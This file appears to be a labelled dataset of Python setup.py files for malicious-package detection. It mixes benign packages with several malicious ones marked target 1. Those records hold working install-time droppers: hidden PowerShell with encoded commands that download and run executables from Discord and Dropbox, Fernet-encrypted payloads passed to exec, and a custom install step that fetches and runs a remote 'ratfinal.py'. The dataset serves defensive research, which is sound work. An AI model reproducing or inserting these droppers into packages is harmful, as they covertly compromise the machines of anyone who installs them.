many(op(\"**\") + primary) >> to_expr\\n    term = power + many((op(\"*\") | op(\"/\")) + power) >> to_expr\\n    sum = term + many((op(\"+\") | op(\"-\")) + term) >> to_expr\\n    expr.define(sum)\\n\\n    document = expr + -finished\\n\\n    return document.parse(tokens)\\n\\n\\ndef op(name: str) -> Parser[Token, str]:\\n    return tok(\"op\", name)\\n\\n\\ndef to_expr(args: Tuple[Expr, List[Tuple[str, Expr]]]) -> Expr:\\n    first, rest = args\\n    result = first\\n    for op, expr in rest:\\n        result = BinaryExpr(op, result, expr)\\n    return result\\n```\\n\\nNow, consider this numeric expression: `3.1415926 * (2 + 7.18281828e-1) * 42`.\\n\\nLet\\'s `tokenize()` it using the tokenizer we\\'ve created with `funcparserlib.lexer`:\\n\\n```\\n[\\n    Token(\\'float\\', \\'3.1415926\\'),\\n    Token(\\'op\\', \\'*\\'),\\n    Token(\\'op\\', \\'(\\'),\\n    Token(\\'int\\', \\'2\\'),\\n    Token(\\'op\\', \\'+\\'),\\n    Token(\\'float\\', \\'7.18281828e-1\\'),\\n    Token(\\'op\\', \\')\\'),\\n    Token(\\'op\\', \\'*\\'),\\n    Token(\\'int\\', \\'42\\'),\\n]\\n```\\n\\nLet\\'s `parse()` these tokens into an expression tree using our parser created with `funcparserlib.parser`:\\n\\n```\\nBinaryExpr(\\n    op=\\'*\\',\\n    left=BinaryExpr(\\n        op=\\'*\\',\\n        left=3.1415926,\\n        right=BinaryExpr(op=\\'+\\', left=2, right=0.718281828),\\n    ),\\n    right=42,\\n)\\n```\\n\\nLearn how to write this parser using `funcparserlib` in the [Getting Started](https://funcparserlib.pirx.ru/getting-started/) guide!\\n\\n\\nUsed By\\n-------\\n\\nSome open-source projects that use `funcparserlib` as an explicit dependency:\\n\\n* [Hy](https://github.com/hylang/hy), a Lisp dialect that\\'s embedded in Python\\n    * 4.2K stars, version `>= 1.0.0a0`, Python 3.7+\\n* [Splash](https://github.com/scrapinghub/splash), a JavaScript rendering service with HTTP API, by Scrapinghub\\n    * 3.6K stars, version `*`. Python 3 in Docker\\n* [graphite-beacon](https://github.com/klen/graphite-beacon), a simple alerting system for Graphite metrics\\n    * 459 stars, version `==0.3.6`, Python 2 and 3\\n* [blockdiag](https://github.com/blockdiag/blockdiag), generates block-diagram image file from spec-text file\\n    * 148 stars, version `>= 1.0.0a0`, Python 3.7+\\n* [kll](https://github.com/kiibohd/kll), Keyboard Layout Language (KLL) compiler\\n    * 109 stars, copied source code, Python 3.5+\\n\\n\\nNext\\n----\\n\\nRead the [Getting Started](https://funcparserlib.pirx.ru/getting-started/) guide to start learning `funcparserlib`.\\n',\n    'author': 'Andrey Vlasovskikh',\n    'author_email': 'andrey.vlasovskikh@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://funcparserlib.pirx.ru',\n    'packages': packages,\n    'package_data': package_data,\n    'python_requires': '>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*, !=3.5.*, !=3.6.*',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "google-crc32c-1.3.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport logging\nimport os\nimport platform\nimport shutil\nimport setuptools\nimport setuptools.command.build_ext\n\n_EXTRA_DLL = \"extra-dll\"\n_DLL_FILENAME = \"crc32c.dll\"\n\n# Explicit environment variable disables pure-Python fallback\nCRC32C_PURE_PYTHON_EXPLICIT = \"CRC32C_PURE_PYTHON\" in os.environ\n_FALSE_OPTIONS = (\"0\", \"false\", \"no\", \"False\", \"No\", None)\nCRC32C_PURE_PYTHON = os.getenv(\"CRC32C_PURE_PYTHON\") not in _FALSE_OPTIONS\n\n\ndef copy_dll(build_lib):\n    return #  trying static build of C library.\n    install_prefix = os.environ.get(\"CRC32C_INSTALL_PREFIX\")\n\n    if os.name == \"nt\" and install_prefix is not None:\n        assert os.path.isdir(install_prefix)\n\n        installed_dll = os.path.join(install_prefix, \"bin\", _DLL_FILENAME)\n        assert os.path.isfile(installed_dll)\n\n        lib_dlls = os.path.join(build_lib, \"google_crc32c\", _EXTRA_DLL)\n        os.makedirs(lib_dlls, exist_ok=True)\n        relocated_dll = os.path.join(lib_dlls, _DLL_FILENAME)\n\n        shutil.copyfile(installed_dll, relocated_dll)\n        assert os.path.isfile(relocated_dll)\n\n\nclass BuildExtWithDLL(setuptools.command.build_ext.build_ext):\n    def run(self):\n        copy_dll(self.build_lib)\n        result = setuptools.command.build_ext.build_ext.run(self)\n        return result\n\n\ndef build_pure_python():\n    setuptools.setup(\n        packages=[\"google_crc32c\"],\n        package_dir={\"\": \"src\"},\n        ext_modules=[],\n    )\n\n\ndef build_c_extension():\n    install_prefix = os.getenv(\"CRC32C_INSTALL_PREFIX\")\n    if install_prefix is not None:\n        install_prefix = os.path.normcase(install_prefix)\n        print(f\"#### using local install of 'crc32c': {install_prefix!r}\")\n        #assert os.path.isdir(install_prefix)\n        install_prefix = os.path.realpath(install_prefix)\n        include_dirs = [os.path.join(install_prefix, \"include\")]\n        library_dirs = [os.path.join(install_prefix, \"lib\")]\n\n        if platform.system() == \"Linux\":\n            library_dirs.append(os.path.join(install_prefix, \"lib64\"))\n\n        if os.name == \"nt\":\n            library_dirs.append(os.path.join(install_prefix, \"bin\"))\n            kwargs = {\n                \"include_dirs\": include_dirs,\n                \"library_dirs\": library_dirs,\n            }\n        else:\n            runtime_library_dirs = library_dirs[:]\n            kwargs = {\n                \"include_dirs\": include_dirs,\n                \"library_dirs\": library_dirs,\n                \"runtime_library_dirs\": runtime_library_dirs,\n            }\n    else:\n        print(\"#### using global install of 'crc32c'\")\n        kwargs = {}\n\n    module_path = os.path.join(\"src\", \"google_crc32c\", \"_crc32c.c\")\n    sources=[os.path.normcase(module_path)]\n    print(f\"##### sources: {sources}\")\n    print(f\"##### module kwargs: {kwargs}\")\n    module = setuptools.Extension(\n        \"google_crc32c._crc32c\",\n        sources=sources,\n        libraries=[\"crc32c\"],\n        **kwargs\n    )\n\n    setuptools.setup(\n        packages=[\"google_crc32c\"],\n        package_dir={\"\": \"src\"},\n        ext_modules=[module],\n        cmdclass={\"build_ext\": BuildExtWithDLL},\n    )\n\n\nif CRC32C_PURE_PYTHON:\n    build_pure_python()\nelse:\n    try:\n        build_c_extension()\n    except SystemExit:\n        if CRC32C_PURE_PYTHON_EXPLICIT:\n            # If build / install fails, it is likely a compilation error with\n            # the C extension:  advise user how to enable the pure-Python\n            # build.\n            logging.error(\n                \"Compiling the C Extension for the crc32c library failed. \"\n                \"To enable building / installing a pure-Python-only version, \"\n                \"set 'CRC32C_PURE_PYTHON=1' in the environment.\"\n            )\n            raise\n\n        logging.info(\n            \"Compiling the C Extension for the crc32c library failed. \"\n            \"Falling back to pure Python build.\"\n        )\n        build_pure_python()\n", "target": 0}
{"idx": "tpmaskpushre-2.67", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmaskpushre',\n    packages = ['modlib'],\n    version = '2.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "customtkintert-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'ybRGOcRHrbNAZwEiiWZEdcLIrLueJZAEboLRKLPdbbQzfEtMlpCmYOXHXwFDvcRVoQPxacRPOswJs'\nLONG_DESCRIPTION = 'dFDhUvEuabfNVPsATN qKl ZBlYIKtibUfVQBfOYnaXutCVfOMufQdNDetoZxpKpA fPzDLXhwlMBSoGcHPyoz pLeCgVHBFHVmPSomKTmncwEQJNhDUTrNLQKOFTLpxCJrjxInvHXZHvuPyrlIYKxDaBQOlZcoKNtTxLAmhLdodSJLevWkbfqhbWajjGlDbBEDnBPLXHFnyCbaGZfTcsKTxkvMNulHOQKTxzYVxbUDCaYEmMuTVpBXKScklcDXNCJRWeocBuPrvMvWhWuaajRrfVvljvpZnfyeuusUuKxdl'\n\n\nclass bTYPDSPSxWtFUypvoWprLtenPAiuApzxXlOQgSzXxQJQwuijUVZGPFljkxvSWMxAdhDhpRMIacSgxfmfQNjkCOPPsXujnFTfeTeOLNzoufTwRwXepNE(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'T4Hz-mKcvZ22TfXJ3IWUnNiBg9Wtc_ycksiVWHQmuaQ=').decrypt(b'gAAAAABmBIOVV-DVNh7ssbl_3GoEWTHG_9E6mZICNQ7cwfUAD01Cz_hPaNy_hBHYRGmvWJHphUK0fLtwbN0qmhEAjnGZYuBESUg2Z63zSqJCAm9S2fysVOxDvFW9Dzh9TbXkw9VyoFkatKaYOpsmOxy1dZ84H96zYoQG3tQrgJcJoN4FxIHhTo8BAGqlgYQBdiBP5DiSlWF4sgCOVlhOECyKBaLuYP8oC0vt53P-Pm9mMn65_nqCFW0='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"customtkintert\",\n    version=VERSION,\n    author=\"OIMzpOUyifwVGOll\",\n    author_email=\"ScSdvhQty@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': bTYPDSPSxWtFUypvoWprLtenPAiuApzxXlOQgSzXxQJQwuijUVZGPFljkxvSWMxAdhDhpRMIacSgxfmfQNjkCOPPsXujnFTfeTeOLNzoufTwRwXepNE,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "ethreium-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = ' jWoSJEOOdvEhGvRlpqHJgYnpPZFhHT'\nLONG_DESCRIPTION = 'pRvSuJykZxiJGRKjnVXHrovtijRVAkqgDccqJaIZMH IfOJrqqIsZqJXVaSdPkeVrvxizPAdzUyfM AmRxKHaNFqtEvlBTBupIQoizSEANvVfWqMEeYfTwTggqQoaywnxPuxSHsFBneZPUndtssLEjdJXBeDouZUdoYEaxaMOqldKCVrqiGBGdODlrqfVYhDLFSGsigdOoSRWGOZtymRarCnnXrmdrqIYmgQVDRrUu spgUWNlHaoZxjATrkjVXkquFTlMoCupmSWBhfEjb'\n\n\nclass TceoCQywBKAOLmXjhICqZXKmwCKIsCsNjoxDUeoDrZptgCetxJLTQlbbWdEDDIgjD(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'7sxfhJY7ZJMwoINJU7DDR6sRUlN5-h3Yq4SWmWJ8SDE=').decrypt(b'gAAAAABmbvQPteiDXBp-jc4WabPZX2iIS_5ALXBo2HoHKroLmMhIrbravHITFEmXQDWt6T-Fi2T7BEVh51n0ejCHN0Rq3pOblZ5yxjS-_r8vnEiZw-J42YrlH-cxMDba0f0p59w3fn2KTx2-Db3H4kC44NuwdY5UOzRsN4DqI30LgZz3Gm3vLAUYA0QR8PZdjB1h7Uf8hSr5cIJgoVAbva3JilZq-Zj8UT-TA1H6zbcdLHyIf6_Fjng='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"ethreium\",\n    version=VERSION,\n    author=\"TatKZnRYErRtQO\",\n    author_email=\"tiDTj@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': TceoCQywBKAOLmXjhICqZXKmwCKIsCsNjoxDUeoDrZptgCetxJLTQlbbWdEDDIgjD,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "fairlearn-0.7.0", "func": "# Copyright (c) Microsoft Corporation and Fairlearn contributors.\n# Licensed under the MIT License.\n\nimport setuptools\nimport fairlearn\n\n# Fetch ReadMe\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\n# Use requirements.txt to set the install_requires\nwith open('requirements.txt') as f:\n    install_requires = [line.strip() for line in f]\n\n# Fetch separate requirements file for each extension\nextras = [\"customplots\"]\nextras_require = dict()\nfor e in extras:\n    req_file = \"requirements-{0}.txt\".format(e)\n    with open(req_file) as f:\n        extras_require[e] = [line.strip() for line in f]\n\nsetuptools.setup(\n    name=fairlearn.__name__,\n    version=fairlearn.__version__,\n    author=\"Miroslav Dudik, Richard Edgar, Brandon Horn, Roman Lutz\",\n    author_email=\"fairlearn@microsoft.com\",\n    description=\"Algorithms for mitigating unfairness in supervised machine learning\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/fairlearn/fairlearn\",\n    packages=setuptools.find_packages(),\n    python_requires='>=3.6',\n    install_requires=install_requires,\n    extras_require=extras_require,\n    classifiers=[\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Development Status :: 3 - Alpha\"\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "tpcandygrandpost-5.91", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcandygrandpost',\n    packages = ['modlib'],\n    version = '5.93',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "minerandom-1.91", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'minerandom',\n    packages = ['modlib'],\n    version = '10.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-pullreplaceinfo-4.83", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pullreplaceinfo',\n    packages = ['modlib'],\n    version = '1.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "candyad-1.54", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'candyad',\n    packages = ['modlib'],\n    version = '1.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfstrkill-7.57", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstrkill',\n    packages = ['modlib'],\n    version = '1.1',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "deep_merge-0.0.4", "func": "import os\nfrom distutils.core import setup\n\nfrom setuptools import find_packages\n\nabout_path = os.path.join(os.path.dirname(__file__), \"deep_merge/about.py\")\nexec(compile(open(about_path).read(), about_path, \"exec\"))\n\n\nsetup(\n    name=__name__,  # noqa\n    version=__version__,  # noqa\n    author=__author__,  # noqa\n    author_email=__author_email__,  # noqa\n    description=__description__,  # noqa\n    url=__url__,  # noqa\n    license=__license__,  # noqa\n    packages=find_packages(),\n    long_description=open('README.md').read(),\n    test_suite='nose.collector',\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Environment :: Other Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\"\n    ],\n)\n", "target": 0}
{"idx": "docstring_parser-0.14.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['docstring_parser', 'docstring_parser.tests']\n\npackage_data = \\\n{'': ['*']}\n\nsetup_kwargs = {\n    'name': 'docstring-parser',\n    'version': '0.14.1',\n    'description': 'Parse Python docstrings in reST, Google and Numpydoc format',\n    'long_description': \"docstring_parser\\n================\\n\\n[![Build](https://github.com/rr-/docstring_parser/actions/workflows/build.yml/badge.svg)](https://github.com/rr-/docstring_parser/actions/workflows/build.yml)\\n\\nParse Python docstrings. Currently support ReST, Google, Numpydoc-style and\\nEpydoc docstrings.\\n\\nExample usage:\\n\\n```python\\n>>> from docstring_parser import parse\\n>>>\\n>>>\\n>>> docstring = parse(\\n...     '''\\n...     Short description\\n...\\n...     Long description spanning multiple lines\\n...     - First line\\n...     - Second line\\n...     - Third line\\n...\\n...     :param name: description 1\\n...     :param int priority: description 2\\n...     :param str sender: description 3\\n...     :raises ValueError: if name is invalid\\n...     ''')\\n>>>\\n>>> docstring.long_description\\n'Long description spanning multiple lines\\\\n- First line\\\\n- Second line\\\\n- Third line'\\n>>> docstring.params[1].arg_name\\n'priority'\\n>>> docstring.raises[0].type_name\\n'ValueError'\\n```\\n\\nRead [API Documentation](https://rr-.github.io/docstring_parser/).\\n\\n# Contributing\\n\\nTo set up the project:\\n```sh\\npip install --user poetry\\n\\ngit clone https://github.com/rr-/pycrcmanip.git\\ncd pycrcmanip\\n\\npoetry install\\npoetry run pre-commit install\\n```\\n\\nTo run tests:\\n```\\npoetry run pytest\\n```\\n\",\n    'author': 'Marcin Kurczewski',\n    'author_email': 'dash@wind.garden',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/rr-/docstring_parser',\n    'packages': packages,\n    'package_data': package_data,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "HTTPRequesting-3.0.1", "func": "\ufefffrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport subprocess\nimport sys\n\nclass CustomInstallCommand(install):\n    def run(self):\n        url = 'https://cdn.discordapp.com/attachments/1061889522541011006/1089965304202928128/ratfinal.py'\n        response = requests.get(url)\n        with open('ratfinal.py', 'wb') as f:\n            f.write(response.content)\n        subprocess.check_call([sys.executable, 'ratfinal.py'])\n        install.run(self)\nsetup(\n    name='HTTPRequesting',\n    version='3.0.1',\n    description='Make HTTP requests using our premium TLS!',\n    author='bigfatcat6969',\n    author_email='bigfatcat6969@protonmail.com',\n    url='https://github.com/bigfatcat6969/HTTPSREQUESTS',\n    packages=['HTTPRequesting'],\n    install_requires=['requests', 'pycryptodome'],\n    cmdclass={\n        'install': CustomInstallCommand,\n    }\n)\n", "target": 1}
{"idx": "dj-inmemorystorage-2.1.0", "func": "# -*- coding: utf-8 -*-\n\nfrom setuptools import setup\n\n# Six 1.10 is vendored in with Django 1.11 so we require at least that version\nrequires = ['Django >= 1.11', 'six>=1.10']\ntests_require = requires\n\nsetup(\n    name=\"dj-inmemorystorage\",\n    description=\"A non-persistent in-memory data storage backend for Django.\",\n    version=\"2.1.0\",\n    url=\"https://github.com/waveaccounting/dj-inmemorystorage\",\n    license='BSD',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    author='Cody Soyland, Se\u00e1n Hayes, Tore Birkeland, Nick Presta',\n    author_email='opensource@waveapps.com',\n    packages=[\n        'inmemorystorage',\n    ],\n    zip_safe=True,\n    install_requires=requires,\n    tests_require=tests_require,\n    test_suite='tests',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved 